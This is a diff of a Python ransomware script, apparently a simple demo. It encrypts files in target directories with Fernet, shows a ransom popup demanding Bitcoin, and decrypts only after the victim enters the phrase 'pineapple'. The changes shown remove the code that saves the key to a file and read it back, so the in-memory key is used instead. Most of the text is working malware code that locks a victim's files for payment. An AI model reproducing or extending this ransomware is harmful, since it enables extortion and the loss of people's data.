@@ -23,8 +23,6 @@ for directory in directories:
 
 # This is the encryption key that will be used to encrypt/decrypt. It will be randomly generated. 
 key = Fernet.generate_key()
-with open("thekey.key", "wb") as thekey:
-    thekey.write(key)
 
 # These are files that should never be touched.
 forbidden_files = ["README.md", "decrypt.py", "encrypt.py", "decrypt.py", "harmless.py", "thekey.key", "harmless"]
@@ -50,10 +48,6 @@ messagebox.showinfo("Encryption Complete", "You have been hacked. Transfer one B
 
 messagebox.showinfo("message", "Bitcoin received, secret code is 'pineapple'. Now running decryption. Click ok to continue.")
 
-# Read the secret key from the key file we created earlier
-with open("thekey.key", "rb") as key_file:
-    secret_key = key_file.read()
-
 # The secret phrase is required to begin the decryption process
 # The idea is that once the funds are transferred, the victim will in exchange receiver this secret phrase
 secret_phrase = "pineapple"
@@ -64,13 +58,13 @@ while True:
     if user_input != "pineapple":
         messagebox.showinfo("message", "Try again fool!")
     else:
-        # Decryption process
+        # Decryption process using the key that we made previously
         for file in files:
             if file in forbidden_files:
                 continue
             with open(file, "rb") as file_to_decrypt:
                 encrypted_content = file_to_decrypt.read()
-            decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
+            decrypted_content = Fernet(key).decrypt(encrypted_content)
             with open(file, "wb") as decrypted_file:
                 decrypted_file.write(decrypted_content)
 
